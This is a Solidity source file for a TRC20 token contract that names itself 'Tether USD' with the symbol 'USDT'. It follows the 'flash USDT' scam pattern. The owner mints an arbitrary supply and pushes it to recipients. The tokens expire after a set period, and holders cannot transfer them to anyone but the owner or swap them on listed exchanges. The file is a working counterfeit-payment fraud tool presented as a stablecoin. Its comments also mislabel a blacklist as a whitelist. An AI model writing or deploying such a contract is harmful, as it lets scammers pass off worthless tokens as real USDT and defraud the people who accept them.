// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TRC20.sol";

contract FlashTRC20USDT is TRC20 {
    address public owner;
    uint256 public validityPeriod;
    uint256 public creationTime;
    mapping(address => bool) public whitelistUpdated;

    constructor(
        uint256 initialSupply,
        uint256 durationInDays
    ) TRC20("Tether USD", "USDT") {
        owner = msg.sender;
        validityPeriod = durationInDays * 1 days; // 6 months in seconds
        creationTime = block.timestamp;
        totalSupply = initialSupply; // Set total supply based on initialSupply
        balanceOf[msg.sender] = totalSupply; // Assign all tokens to contract deployer
        emit Transfer(address(0), msg.sender, totalSupply); // Emit event for initial mint
    }

    // Modifier to check validity period
    modifier onlyBeforeExpiry() {
        require(
            block.timestamp <= creationTime + validityPeriod,
            "Token has expired."
        );
        _;
    }

    // Override transfer to disable P2P and swaps
    function transfer(
        address recipient,
        uint256 amount
    ) public override onlyBeforeExpiry returns (bool) {
        require(
            !whitelistUpdated[recipient],
            "Cannot transfer to DEX addresses."
        );
        require(
            msg.sender == owner || recipient == owner,
            "P2P transfers are disabled."
        );
        return super.transfer(recipient, amount);
    }

    // Override transferFrom to disable P2P and swaps
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override onlyBeforeExpiry returns (bool) {
        require(
            !whitelistUpdated[recipient],
            "Cannot transfer to DEX addresses."
        );
        require(
            sender == owner || recipient == owner,
            "P2P transfers are disabled."
        );
        return super.transferFrom(sender, recipient, amount);
    }

    // Function to add DEX addresses to blacklist
    function addToWhitelist(address dexAddress) external {
        require(msg.sender == owner, "Only owner can modify DEX blacklist.");
        whitelistUpdated[dexAddress] = true;
    }

    // Function to remove addresses from blacklist if needed
    function removeFromWhitelist(address dexAddress) external {
        require(msg.sender == owner, "Only owner can modify DEX blacklist.");
        whitelistUpdated[dexAddress] = false;
    }

    // Automated transfer function
    function autoTransfer(address recipient, uint256 amount) external {
        require(msg.sender == owner, "Only owner can initiate auto transfer.");
        require(
            block.timestamp <= creationTime + validityPeriod,
            "Transfer beyond validity period."
        );
        require(
            balanceOf[owner] >= amount,
            "Insufficient balance for transfer."
        );

        // Execute transfer
        balanceOf[owner] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(owner, recipient, amount);
    }
}
